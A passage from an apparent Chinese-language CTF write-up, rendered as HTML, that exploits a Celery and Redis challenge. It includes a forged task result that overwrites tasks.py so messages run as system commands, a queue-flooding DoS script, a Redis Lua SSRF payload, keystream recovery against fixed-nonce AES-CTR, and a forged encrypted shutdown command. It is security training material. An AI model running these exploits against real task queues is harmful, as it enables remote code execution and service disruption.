+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;Connection: close</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34; + 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ).encode() + request_body
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    chunks: list[bytes] = []
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    with socket.create_connection((host, port), timeout=5) as sock:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        sock.sendall(payload)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        while True:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            data = sock.recv(4096)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            if not data:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                break
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            chunks.append(data)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    preview = b&#34;&#34;.join(chunks)[:2048]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    return {&#34;preview&#34;: preview.decode(errors=&#34;replace&#34;), &#34;bytes&#34;: len(preview)}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write_file</span>(task_id : str):
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;path&#34;</span> : <span style="color:#e6db74">&#34;/app/src/tasks.py&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;content&#34;</span> : pwned_taskspy
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    set celery-task-meta-</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> &#39;{&#34;status&#34;: &#34;FAILURE&#34;, &#34;result&#34;: {&#34;exc_type&#34;: &#34;DiagnosticsPersistError&#34;, &#34;exc_message&#34;: &#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;, &#34;exc_module&#34;: &#34;framework.app&#34;}, &#34;traceback&#34;: &#34;&#34;, &#34;children&#34;: [], &#34;date_done&#34;: &#34;2025-10-31T06:15:48.956927&#34;, &#34;task_id&#34;: &#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;}&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span><span style="color:#f92672">.</span>strip() <span style="color:#f92672">%</span> (task_id, json<span style="color:#f92672">.</span>dumps(payload)<span style="color:#f92672">.</span>encode()<span style="color:#f92672">.</span>hex(), task_id)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    wapper(data, <span style="color:#e6db74">&#39;write file&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>task_id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>write_file(task_id)
+</span></span></code></pre></div><p>这个 <code>tasks.py</code> 让 <code>echo</code> 任务的 <code>message</code> 作为系统命令执行并拿到回显。</p>
+<h1 id="restart">restart<a hidden class="anchor" aria-hidden="true" href="#restart">#</a></h1>
+<h2 id="获取密钥流">获取密钥流<a hidden class="anchor" aria-hidden="true" href="#获取密钥流">#</a></h2>
+<p>尝试覆盖 <code>tasks.py</code> 然后触发 <code>worker</code> 的重启进而执行新的 <code>tasks.py</code>。在 <code>celery + redis</code> 的架构下，<code>broker</code> 可以通过 <code>redis</code> 的 <code>PUB/SUB</code> 发布命令，其中包含 <code>pool_restart</code> 和 <code>shutdown</code> 等。</p>
+<p>不过，题目给 <code>celery</code> 加上了加密，代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> __future__ <span style="color:#f92672">import</span> annotations
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> hashlib <span style="color:#f92672">import</span> md5, sha1
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> typing <span style="color:#f92672">import</span> Any
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> .config <span style="color:#f92672">import</span> settings
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> logging
+</span></span><span style="display:flex;"><span>_TASK_KEY <span style="color:#f92672">=</span> sha1(settings<span style="color:#f92672">.</span>secret_key<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>digest()[:<span style="color:#ae81ff">16</span>]
+</span></span><span style="display:flex;"><span>_TASK_NONCE <span style="color:#f92672">=</span> md5(socket<span style="color:#f92672">.</span>gethostname()<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>digest()[:<span style="color:#ae81ff">8</span>]
+</span></span><span style="display:flex;"><span>logging<span style="color:#f92672">.</span>basicConfig(level<span style="color:#f92672">=</span>logging<span style="color:#f92672">.</span>INFO)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt_bytes</span>(data: bytes) <span style="color:#f92672">-&gt;</span> bytes:
+</span></span><span style="display:flex;"><span>    cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(_TASK_KEY, AES<span style="color:#f92672">.</span>MODE_CTR, nonce<span style="color:#f92672">=</span>_TASK_NONCE)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> cipher<span style="color:#f92672">.</span>encrypt(data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt_bytes</span>(data: bytes) <span style="color:#f92672">-&gt;</span> bytes:
+</span></span><span style="display:flex;"><span>    cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(_TASK_KEY, AES<span style="color:#f92672">.</span>MODE_CTR, nonce<span style="color:#f92672">=</span>_TASK_NONCE)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> cipher<span style="color:#f92672">.</span>decrypt(data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dumps</span>(payload: Any) <span style="color:#f92672">-&gt;</span> bytes:
+</span></span><span style="display:flex;"><span>    raw <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>dumps(payload, separators<span style="color:#f92672">=</span>(<span style="color:#e6db74">&#34;,&#34;</span>, <span style="color:#e6db74">&#34;:&#34;</span>), ensure_ascii<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> encrypt_bytes(raw)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">loads</span>(ciphertext: bytes) <span style="color:#f92672">-&gt;</span> Any:
+</span></span><span style="display:flex;"><span>    raw <span style="color:#f92672">=</span> decrypt_bytes(ciphertext)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> json<span style="color:#f92672">.</span>loads(raw<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span></code></pre></div><p>存在漏洞，<code>CTR</code> 模式为序列密码，而题目中 <code>key</code> 和 <code>nonce</code> 是固定的，则密钥流也是固定的，此时可以进行明文攻击，同时拿到明文和密文可以算出密钥流。</p>
+<p><code>fetch task</code> 代码设置了 <code>timeout</code> 为 <code>5s</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@celery_app.task</span>(name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;miniws.fetch&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fetch_task</span>(url: str, <span style="color:#f92672">*</span>, host_header: str <span style="color:#f92672">|</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>, body: str <span style="color:#f92672">|</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>, verb: str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;GET&#34;</span>) <span style="color:#f92672">-&gt;</span> Dict[str, Any]:
+</span></span><span style="display:flex;"><span>    parsed <span style="color:#f92672">=</span> urlparse(url)
+</span></span><span style="display:flex;"><span>    host <span style="color:#f92672">=</span> parsed<span style="color:#f92672">.</span>hostname <span style="color:#f92672">or</span> settings<span style="color:#f92672">.</span>redis_host
+</span></span><span style="display:flex;"><span>    port <span style="color:#f92672">=</span> parsed<span style="color:#f92672">.</span>port <span style="color:#f92672">or</span> (<span style="color:#ae81ff">443</span> <span style="color:#66d9ef">if</span> parsed<span style="color:#f92672">.</span>scheme <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;https&#34;</span> <span style="color:#66d9ef">else</span> <span style="color:#ae81ff">80</span>)
+</span></span><span style="display:flex;"><span>    path <span style="color:#f92672">=</span> parsed<span style="color:#f92672">.</span>path <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;/&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> parsed<span style="color:#f92672">.</span>query:
+</span></span><span style="display:flex;"><span>        path <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>path<span style="color:#e6db74">}</span><span style="color:#e6db74">?</span><span style="color:#e6db74">{</span>parsed<span style="color:#f92672">.</span>query<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    request_host <span style="color:#f92672">=</span> host_header <span style="color:#f92672">or</span> parsed<span style="color:#f92672">.</span>netloc <span style="color:#f92672">or</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    request_body <span style="color:#f92672">=</span> body<span style="color:#f92672">.</span>encode() <span style="color:#66d9ef">if</span> body <span style="color:#66d9ef">else</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> (
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>verb<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>path<span style="color:#e6db74">}</span><span style="color:#e6db74"> HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Host: </span><span style="color:#e6db74">{</span>request_host<span style="color:#e6db74">}</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;User-Agent: MiniFetch/1.0</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Connection: close</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    )<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> request_body
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    chunks: list[bytes] <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> socket<span style="color:#f92672">.</span>create_connection((host, port), timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>) <span style="color:#66d9ef">as</span> sock:
+</span></span><span style="display:flex;"><span>        sock<span style="color:#f92672">.</span>sendall(payload)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>            data <span style="color:#f92672">=</span> sock<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> data:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>            chunks<span style="color:#f92672">.</span>append(data)
+</span></span><span style="display:flex;"><span>    preview <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(chunks)[:<span style="color:#ae81ff">2048</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;preview&#34;</span>: preview<span style="color:#f92672">.</span>decode(errors<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;replace&#34;</span>), <span style="color:#e6db74">&#34;bytes&#34;</span>: len(preview)}
+</span></span></code></pre></div><p>可以用这个来 <code>DOS</code> ，让任务队列堵塞，然后 <code>SSRF redis</code> 用 <code>lua</code> 脚本拿到密文。</p>
+<p>触发堵塞的 <code>EXP</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://192.168.72.132:5001&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/tasks/fetch/</span><span style="color:#e6db74">%252e%252e</span><span style="color:#e6db74">/asd&#39;</span>, json<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;url&#34;</span>:<span style="color:#e6db74">&#34;http://192.168.72.131:6378&#34;</span>,<span style="color:#e6db74">&#34;verb&#34;</span>:<span style="color:#e6db74">&#34;GET&#34;</span>}) <span style="color:#75715e"># 用一个不存在的 IP 会消耗 5s 时间</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyboardInterrupt</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/tasks/echo&#39;</span>, json<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111&#34;</span>})
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyboardInterrupt</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span></code></pre></div><p>先发送 <code>10</code> 个 <code>fetch</code> 任务堵塞队列，后面一直发送 <code>echo</code> 任务。接着连续发送这个 <code>SSRF Payload</code>：</p>
+<pre tabindex="0"><code>EVAL &#34;local element_list = redis.call(&#39;LRANGE&#39;, KEYS[1], 0, 0) if not element_list or #element_list == 0 then return nil end local first_element = element_list[1] local escaped_value = string.gsub(first_element, &#39;\\&#34;&#39;, &#39;\\\\\\\\\\&#34;&#39;) local json_result = &#39;{\\&#34;status\\&#34;: \\&#34;SUCCESS\\&#34;, \\&#34;result\\&#34;: {\\&#34;echo\\&#34;: \\&#34;&#39; .. escaped_value .. &#39;\\&#34;}, \\&#34;traceback\\&#34;: null, \\&#34;children\\&#34;: [], \\&#34;date_done\\&#34;: \\&#34;2025-10-31T03:20:37.823922\\&#34;, \\&#34;task_id\\&#34;: \\&#34;&lt;uuid&gt;\\&#34;}&#39; redis.call(&#39;SET&#39;, KEYS[2], json_result) return json_result&#34; 2 celery celery-task-meta-&lt;uuid&gt;
+</code></pre><p>这个 <code>lua</code> 脚本会读取 <code>celery</code> 队列的第一个然后赋值给一个 <code>key</code>，运行上面 <code>DOS</code> 脚本后，马上<strong>多次</strong>发送 <code>lua</code> 脚本。再通过指定的 <code>uuid</code> 就能够读取到密文了。</p>
+<p>计算密钥流：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>plaintext <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[[],{&#34;message&#34;:&#34;111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111&#34;},{&#34;callbacks&#34;:null,&#34;errbacks&#34;:null,&#34;chain&#34;:null,&#34;chord&#34;:null}]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>encode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">tVcJqAkEgomM+S9W7E0er7nxxvRbPGVKva26QEGh5A+jUnSlfZydMeb4edf9XkKVWZTUitk6avW0FBpbo9Cwz9QK0WuYjcr9Rofy3ECZw6EqDO5XQoYPEkScwW3Nlb5cqYY80ZSaQajPJTYI/ofbbNTqVMrIe8F6HM6Hjs3yiGZ1xxw21yn3TdH6KcdTTKZHjWnxiDEljKura1QJiV4fbbbA9+dbWb2B04Bb1qKgWn9L8d9HyifZdpkkuEj8ktTPtJZd9BguR7ma1ONX5tvs683hWYV3yZOSXyPlxbFDzkpT/QalATKleUl9oL9DUNb5vbnW+qDgoJoli4meBWxwNV/2ADUDJtKSNmhNoAqYEAzvZP9Ig961X9qj0ZcDqJzZ+/WNmoEHskqYUwmCqwEBpCL/0twT4VoTlrJd6VQVW2kHVji6+eQIyaxNLOmygNAfl0mZ4pTOOlGj8RUDo5jUXLMPm7tGQYaVQ6rEq0lmKjYv3uq8dxvI5E3iYzPlA3Ued/mMqvBcjDcgcJUOEWKamEPAgim2AcblfhBGMVJu5SjnvH3Tz+H6GEScmrnf8ABNAsCU6DdqV9V9YkcjZWcVnj2LlJRXsCCfHfVxsneFcb6UvEkgFLBWF/SDzcNwcDJ8ovplSvc=
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cpher <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(s)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>key_stream <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(cpher)):
+</span></span><span style="display:flex;"><span>    c <span style="color:#f92672">=</span> cpher[i]
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> plaintext[i]
+</span></span><span style="display:flex;"><span>    k <span style="color:#f92672">=</span> c <span style="color:#f92672">^</span> p
+</span></span><span style="display:flex;"><span>    key_stream<span style="color:#f92672">.</span>append(k)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(key_stream)
+</span></span></code></pre></div><p>对于 <code>echo 111 ...</code> 任务来说，明文格式是确定的，异或得到密钥流。</p>
+<h2 id="shutdown">shutdown<a hidden class="anchor" aria-hidden="true" href="#shutdown">#</a></h2>
+<p><code>pool_restart</code> 功能默认是关闭的，而 <code>shutdown</code> 默认是开启的，而且 <code>worker</code> 进程被 <code>supervisor</code> 守护重启，所以效果一样。</p>
+<p><code>shutdown</code> 命令格式为：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;method&#34;</span> : <span style="color:#e6db74">&#34;shutdown&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;arguments&#34;</span> : {},
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;destination&#34;</span> : <span style="color:#66d9ef">null</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;pattern&#34;</span> : <span style="color:#66d9ef">null</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;matcher&#34;</span> : <span style="color:#66d9ef">null</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;ticket&#34;</span> : <span style="color:#e6db74">&#34;8b3edc18-e6c9-41df-8fbb-e3452b0db26f&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;reply_to&#34;</span> : {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;exchange&#34;</span> : <span style="color:#e6db74">&#34;reply.celery.pidbox&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;routing_key&#34;</span> : <span style="color:#e6db74">&#34;082a4b30-f17a-3be9-ac0e-023e96bcc32a&#34;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>ticket</code> 和 <code>routing_key</code> 的值设置为随机 <code>uuid</code> 即可，不存在校验。</p>
+<p>加密脚本：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">{&#34;method&#34;:&#34;shutdown&#34;,&#34;arguments&#34;:</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">,&#34;destination&#34;:null,&#34;pattern&#34;:null,&#34;matcher&#34;:null,&#34;ticket&#34;:&#34;8b3edc18-e6c9-41df-8fbb-e3452b0db26f&#34;,&#34;reply_to&#34;:{&#34;exchange&#34;:&#34;reply.celery.pidbox&#34;,&#34;routing_key&#34;:&#34;082a4b30-f17a-3be9-ac0e-023e96bcc32a&#34;}}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>encode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">e_with_key</span>(data : bytes):
+</span></span><span style="display:flex;"><span>    key_stream <span style="color:#f92672">=</span> [<span style="color:#ae81ff">238</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">84</span>, <span style="color:#ae81ff">132</span>, <span style="color:#ae81ff">114</span>, <span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">239</span>, <span style="color:#ae81ff">236</span>, <span style="color:#ae81ff">255</span>, <span style="color:#ae81ff">138</span>, <span style="color:#ae81ff">78</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">137</span>, <span style="color:#ae81ff">111</span>, <span style="color:#ae81ff">36</span>, <span style="color:#ae81ff">141</span>, <span style="color:#ae81ff">136</span>, <span style="color:#ae81ff">192</span>, <span style="color:#ae81ff">247</span>, <span style="color:#ae81ff">197</span>, <span style="color:#ae81ff">106</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">84</span>, <span style="color:#ae81ff">123</span>, <span style="color:#ae81ff">140</span>, <span style="color:#ae81ff">156</span>, <span style="color:#ae81ff">139</span>, <span style="color:#ae81ff">113</span>, <span style="color:#ae81ff">112</span>, <span style="color:#ae81ff">144</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">62</span>, <span style="color:#ae81ff">146</span>, <span style="color:#ae81ff">99</span>, <span style="color:#ae81ff">69</span>, <span style="color:#ae81ff">148</span>, <span style="color:#ae81ff">76</span>, <span style="color:#ae81ff">173</span>, <span style="color:#ae81ff">172</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">215</span>, <span style="color:#ae81ff">201</span>, <span style="color:#ae81ff">72</span>, <span style="color:#ae81ff">230</span>, <span style="color:#ae81ff">204</span>, <span style="color:#ae81ff">111</span>, <span style="color:#ae81ff">115</span>, <span style="color:#ae81ff">164</span>, <span style="color:#ae81ff">104</span>, <span style="color:#ae81ff">165</span>, <span style="color:#ae81ff">229</span>, <span style="color:#ae81ff">187</span>, <span style="color:#ae81ff">232</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">196</span>, <span style="color:#ae81ff">133</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">43</span>, <span style="color:#ae81ff">106</span>, <span style="color:#ae81ff">146</span>, <span style="color:#ae81ff">225</span>, <span style="color:#ae81ff">129</span>, <span style="color:#ae81ff">254</span>, <span style="color:#ae81ff">229</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">224</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">169</span>, <span style="color:#ae81ff">188</span>, <span style="color:#ae81ff">251</span>, <span style="color:#ae81ff">204</span>, <span style="color:#ae81ff">119</span>, <span style="color:#ae81ff">182</span>, <span style="color:#ae81ff">195</span>, <span style="color:#ae81ff">237</span>, <span style="color:#ae81ff">113</span>, <span style="color:#ae81ff">168</span>, <span style="color:#ae81ff">242</span>, <span style="color:#ae81ff">144</span>, <span style="color:#ae81ff">27</span>, <span style="color:#ae81ff">61</span>, <span style="color:#ae81ff">223</span>, <span style="color:#ae81ff">102</span>, <span style="color:#ae81ff">115</span>, <span style="color:#ae81ff">183</span>, <span style="color:#ae81ff">62</span>, <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">117</span>, <span style="color:#ae81ff">173</span>, <span style="color:#ae81ff">240</span>, <span 